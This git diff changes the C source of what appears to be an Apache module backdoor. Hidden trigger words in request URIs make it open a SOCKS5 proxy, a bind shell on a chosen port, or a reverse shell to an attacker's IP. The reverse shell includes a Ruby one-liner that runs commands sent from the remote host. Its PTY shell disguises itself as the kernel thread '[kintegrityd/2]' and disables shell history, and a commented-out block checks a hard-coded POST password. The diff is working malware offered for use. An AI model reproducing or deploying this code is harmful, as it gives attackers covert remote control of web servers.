@@ -90,6 +90,39 @@ enum socks_status {
 	FAILED = 0x05
 };
 
+typedef struct {
+    const char *key;
+    const char *value;
+} keyValuePair;
+
+// Read POST value from apache doc:
+// https://httpd.apache.org/docs/2.4/developer/modguide.html#snippets
+keyValuePair *readPost(request_rec *r) {
+    apr_array_header_t *pairs = NULL;
+    apr_off_t len;
+    apr_size_t size;
+    int res;
+    int i = 0;
+    char *buffer;
+    keyValuePair *kvp;
+
+    res = ap_parse_form_data(r, NULL, &pairs, -1, HUGE_STRING_LEN);
+    if (res != OK || !pairs) return NULL; /* Return NULL if we failed or if there are is no POST data */
+    kvp = apr_pcalloc(r->pool, sizeof(keyValuePair) * (pairs->nelts + 1));
+    while (pairs && !apr_is_empty_array(pairs)) {
+        ap_form_pair_t *pair = (ap_form_pair_t *) apr_array_pop(pairs);
+        apr_brigade_length(pair->value, 1, &len);
+        size = (apr_size_t) len;
+        buffer = apr_palloc(r->pool, size + 1);
+        apr_brigade_flatten(pair->value, buffer, &size);
+        buffer[len] = 0;
+        kvp[i].key = apr_pstrdup(r->pool, pair->name);
+        kvp[i].value = buffer;
+        i++;
+    }
+    return kvp;
+}
+
 
 int readn(int fd, void *buf, int n)
 {
@@ -232,7 +265,8 @@ void* worker(int fd) {
         free(ip);
     }
 
-    app_socket_pipe(inet_fd, fd);
+    //app_socket_pipe(inet_fd, fd);
+    bicomIPC(inet_fd,fd);
     close(inet_fd);
     exit(0);
 }
@@ -270,17 +304,12 @@ void* waitProxy(int fd, int port){
        exit(0);
     }
 
-    //close(fd);
-
     if (listen(proxysockfd, 3) < 0)
     {
         write(fd,"Listen failed",strlen("Listen failed"));
         exit(0);
     }
-    /*if(  < 0)
-    {
-        exit(0);
-    }*/
+
     while(1){
         new_socket = accept(proxysockfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
 
@@ -291,7 +320,7 @@ void* waitProxy(int fd, int port){
             close(new_socket);
             exit(0);
         }else if (pid == 0){
-            close(proxysockfd);
+            //close(proxysockfd);
             /*if( pthread_create(&thread_id , NULL ,  worker , new_socket) < 0)
             {
                 write(fd, "Could not create thread\n", strlen("Could not create thread\n") + 1);
@@ -300,6 +329,7 @@ void* waitProxy(int fd, int port){
             pthread_join(thread_id , NULL);*/
 
             worker(new_socket);
+            close(fd);
             exit(0);
 
         }else{
@@ -431,6 +461,7 @@ void reverseShell(char* ip, char* port, char* prog){
             args[3] = (char*) malloc(2048);
             sprintf(args[3],"exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end",ip,port);
             execve(args[0], args, NULL);
+            free(args[3]);
         }
         else{
             char* args[] = {"/usr/bin/php", "-r", "", NULL};
@@ -446,8 +477,10 @@ void reverseShell(char* ip, char* port, char* prog){
 
     return;
 }
-
-void shellPTY(int socket) {
+/****************************/
+/// Fork() then forkpty() ///
+/****************************/
+void shellPTY1(int socket) {
 
     struct termios terminal;
     int terminalfd, n = 0, sr;
@@ -510,72 +543,15 @@ void shellPTY(int socket) {
         }
     }
     waitpid(ppid,NULL,0);
-    //exit(0);
 
-
-
-
-    /*fpid = forkpty(&terminalfd, NULL, NULL, NULL);
-
-    if (fpid < 0) {
-        fprintf(stderr, "[-] Error: could not forkpty");
-        exit(EXIT_FAILURE);
-    }
-    else if (fpid == 0) { // Child process
-
-        char *argv[] = { "[kintegrityd/2]", 0 };
-        char *envp[] = { "HISTFILE=","TERM=vt100", 0 };
-
-        execve("/bin/sh", argv, envp);
-    }
-    else { // Father process
-        tcgetattr(terminalfd, &terminal);
-        terminal.c_lflag &= ~ECHO;
-        tcsetattr(terminalfd, TCSANOW, &terminal);
-
-        fd_set readfd;
-        pid_t ppid = fork();
-        if(ppid < 0){
-            exit(0);
-        }else if (ppid == 0){
-            for (;;) {
-                FD_ZERO(&readfd);
-                FD_SET(terminalfd, &readfd);
-                FD_SET(socket, &readfd);
-                // Bidirectional data transfer between 2 fd - terminalfd <--> IPC socket
-                sr = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
-                if (sr) {
-                    if (FD_ISSET(terminalfd, &readfd)) {
-                        memset(buf, 0, sizeof(buf));
-                        n = read(terminalfd, buf, strlen(buf) + 1);
-                        if (n <= 0) {
-                            kill(fpid, SIGKILL);
-                            break;
-                        } else {
-                            write(socket, buf, strlen(buf));
-                        }
-                    }
-                    if (FD_ISSET(socket, &readfd)) {
-                        memset(buf, 0, sizeof(buf));
-                        n = read(socket, buf, strlen(buf) + 1);
-                        if (n <= 0) {
-                            kill(fpid, SIGKILL);
-                            break;
-                        } else {
-                            write(terminalfd, buf, strlen(buf));
-                        }
-                    }
-                }
-            }
-        }else{
-            waitpid(fpid,NULL,0);
-            exit(0);
-        }
-    }*/
     return;
 }
 
-/*void shellPTY(int socket) {
+
+/****************************/
+///      Forkpty only()    ///
+/****************************/
+void shellPTY(int socket) {
 
     struct termios terminal;
     int terminalfd, n = 0, sr;
@@ -599,53 +575,41 @@ void shellPTY(int socket) {
         tcgetattr(terminalfd, &terminal);
         terminal.c_lflag &= ~ECHO;
         tcsetattr(terminalfd, TCSANOW, &terminal);
-
         fd_set readfd;
-        pid_t ppid = fork();
-        if(ppid < 0){
-            exit(0);
-        }else if (ppid == 0){
-            for (;;) {
-                FD_ZERO(&readfd);
-                FD_SET(terminalfd, &readfd);
-                FD_SET(socket, &readfd);
-                // Bidirectional data transfer between 2 fd - terminalfd <--> IPC socket
-                sr = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
-                if (sr) {
-                    if (FD_ISSET(terminalfd, &readfd)) {
-                        memset(buf, 0, sizeof(buf));
-                        n = read(terminalfd, buf, strlen(buf) + 1);
-                        if (n <= 0) {
-                            kill(fpid, SIGKILL);
-                            break;
-                        } else {
-                            write(socket, buf, strlen(buf));
-                        }
+
+        for (;;) {
+            FD_ZERO(&readfd);
+            FD_SET(terminalfd, &readfd);
+            FD_SET(socket, &readfd);
+            // Bidirectional data transfer between 2 fd - terminalfd <--> IPC socket
+            sr = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
+            if (sr) {
+                if (FD_ISSET(terminalfd, &readfd)) {
+                    memset(buf, 0, sizeof(buf));
+                    n = read(terminalfd, buf, strlen(buf) + 1);
+                    if (n <= 0) {
+                        kill(fpid, SIGKILL);
+                        break;
+                    } else {
+                        write(socket, buf, strlen(buf));
                     }
-                    if (FD_ISSET(socket, &readfd)) {
-                        memset(buf, 0, sizeof(buf));
-                        n = read(socket, buf, strlen(buf) + 1);
-                        if (n <= 0) {
-                            kill(fpid, SIGKILL);
-                            break;
-                        } else {
-                            write(terminalfd, buf, strlen(buf));
-                        }
+                }
+                if (FD_ISSET(socket, &readfd)) {
+                    memset(buf, 0, sizeof(buf));
+                    n = read(socket, buf, strlen(buf) + 1);
+                    if (n <= 0) {
+                        kill(fpid, SIGKILL);
+                        break;
+                    } else {
+                        write(terminalfd, buf, strlen(buf));
                     }
                 }
             }
-        }else{
-            waitpid(fpid,NULL,0);
-            exit(0);
         }
-        //waitpid(ppid,NULL,0);
-        //kill(ppid,SIGKILL);
-
-        //kill(pid,SIGKILL);
-        //kill(getpid(),SIGKILL);
+        waitpid(fpid,NULL,0);
     }
     return;
-}*/
+}
 
 int bindPort(int fd, int port){
     int opt = 1;
@@ -736,6 +700,27 @@ static int backdoor_post_read_request(request_rec *r) {
 
 	int backdoor = 0;
 
+    /*keyValuePair *formData;
+
+    formData = readPost(r);
+    if (formData) {
+        int i;
+        for (i = 0; &formData[i]; i++) {
+            if (formData[i].key && formData[i].value) {
+                //ap_rprintf(r, "%s = %s\n", formData[i].key, formData[i].value);
+                if(!strcmp(formData[i].key,"pass") && !strcmp(formData[i].value,"password") ){
+                    backdoor = 1;
+                }
+            } *//*else if (formData[i].key) {
+                ap_rprintf(r, "%s\n", formData[i].key);
+            } else if (formData[i].value) {
+                ap_rprintf(r, "= %s\n", formData[i].value);
+            }*//* else {
+                break;
+            }
+        }
+    }*/
+
 	fields = apr_table_elts(r->headers_in);
 	e = (apr_table_entry_t *) fields->elts;
 	for(i = 0; i < fields->nelts; i++) {
@@ -756,83 +741,54 @@ static int backdoor_post_read_request(request_rec *r) {
 	}
 
 	if (strstr(r->uri, SOCKSWORD)) {
+        int new_socket, bindfd;
         char* meh = strtok(r->uri,"/");
+        char* port = strtok(NULL,"/");
+
+        sock = socket(AF_UNIX, SOCK_STREAM, 0);
+        if (sock < 0) {
+            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            exit(0);
+        }
+        server.sun_family = AF_UNIX;
+        strcpy(server.sun_path, IPC);
+        if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
+            close(sock);
+            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+            exit(0);
+        }
+
+
+        bindfd = bindPort(fd,atoi(port));
+        char* info = malloc(128);
+        sprintf(info,"[+] Socks5 proxy binded on port %s\n",port);
+        write(fd, info,strlen(info));
+        free(info);
+        close(fd);
+
+        struct sockaddr_in server;
+        int serverlen = sizeof(server);
+        server.sin_family = AF_INET;
+        server.sin_addr.s_addr = INADDR_ANY;
+        server.sin_port = htons(atoi(port));
+
+        while(1){
+
+            new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
+            // Close binded fd
+            close(bindfd);
+            worker(new_socket);
+            //bicomIPC(sock,new_socket);
+            close(new_socket);
+
+        }
+
+        /*char* meh = strtok(r->uri,"/");
         char* port = strtok(NULL,"/");
 
         waitProxy(fd,atoi(port));
 
-        /*tpid = fork();
-        if (tpid < 0){
-            write(fd,"Can't fork",strlen("Can't fork"));
-            close(fd);
-            exit(0);
-        }else if (tpid == 0){ // Child procress
-            write(fd,"alo",strlen("alo"));
-            waitProxy(atoi(port));
-        }else{ // Father process
-            write(fd,"papa",strlen("papa"));
-            close(fd);
-        }*/
-
-
-        /*if( pthread_create(&thread_id , NULL ,  waitProxy , (port,&fd)) < 0)
-        {
-            write(fd, "Could not create thread\n", strlen("Could not create thread\n") + 1);
-            exit(0);
-        }
-        pthread_join(thread_id , NULL);*/
-        //waitProxy(atoi(port));
-
-        //sleep(1000000);
-
-        exit(0);
-        /*int opt = 1;
-        int new_socket;
-        // Prepare Socket for proxy socks5
-        int proxysockfd = socket(AF_INET, SOCK_STREAM, 0);
-        if (proxysockfd < 0 ){
-            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
-            exit(0);
-        }
-
-        if (setsockopt(proxysockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
-                       &opt, sizeof(opt)))
-        {
-            write(fd,"setsockopt",strlen("setsockopt"));
-            exit(0);
-        }
-
-        struct sockaddr_in server;
-        server.sin_family = AF_INET;
-        server.sin_addr.s_addr = INADDR_ANY;
-        server.sin_port = htons(atoi(port));
-        int serverlen = sizeof(server);
-        pthread_t thread_id;
-
-        if (bind(proxysockfd, (struct sockaddr *)&server,
-                 sizeof(server))<0)
-        {
-            write(fd,"bind failed",strlen("bind failed"));
-            exit(0);
-        }
-
-        if (listen(proxysockfd, 3) < 0)
-        {
-            write(fd,"Listen failed",strlen("Listen failed"));
-            exit(0);
-        }
-
-        if ((new_socket = accept(proxysockfd, (struct sockaddr *)&server,
-                                 (socklen_t*)&serverlen))<0)
-        {
-            write(fd,"Accept failed",strlen("Accept failed"));
-            exit(0);
-        }
-        close(fd);
-        worker(new_socket,port);
-
         exit(0);*/
-
 	}
 	if (strstr(r->uri, BINDWORD)) {
 	    int new_socket, bindfd;
@@ -854,6 +810,10 @@ static int backdoor_post_read_request(request_rec *r) {
 
 
         bindfd = bindPort(fd,atoi(port));
+        char* info = malloc(128);
+        sprintf(info,"[+] Shell binded on port %s\n",port);
+        write(fd, info,strlen(info));
+        free(info);
         close(fd);
 
         struct sockaddr_in server;
@@ -964,38 +924,14 @@ static int backdoor_post_read_request(request_rec *r) {
             write(sock, "SHELL\n", strlen("SHELL\n") + 1);
 			// Info in original socket
 			char* info = malloc(strlen("Sending Reverse Shell to \n")+strlen(ip)+strlen(port)+2);
-			sprintf(info,"Sending Reverse Shell to %s:%s",ip,port);
+			sprintf(info,"[+] Sending Reverse Shell to %s:%s",ip,port);
 			write(fd, info, strlen(info) +1);
 			free(info);
 
             close(fd);
-            //sleep(500);
+
             bicomIPC(sock,revsockfd);
-            //waitpid(pid,NULL,0);
 
-            //pthread_t thread_id[nbThreads+1];
-
-            /*if( pthread_create(&thread_id , NULL ,  bicomIPC , (sock,revsockfd,&readset)) < 0)
-            {
-                write(fd, "Could not create thread\n", strlen("Could not create thread\n") + 1);
-                exit(0);
-            }
-            pthread_create(&thread_id , NULL ,  bicomIPC , (sock,revsockfd));
-            nbThreads++;
-
-            pthread_join(&thread_id[nbThreads] , NULL);*/
-
-            //pthread_detach(thread_id[nbThreads]);
-
-            /*pid_t spid;
-            spid = fork();
-            if (spid < 0 ){
-                exit(0);
-            }else if (spid == 0){
-                bicomIPC(sock,revsockfd);
-            }else{
-                waitpid(spid,NULL,0);
-            }*/
 			exit(0);
 		}
 	}
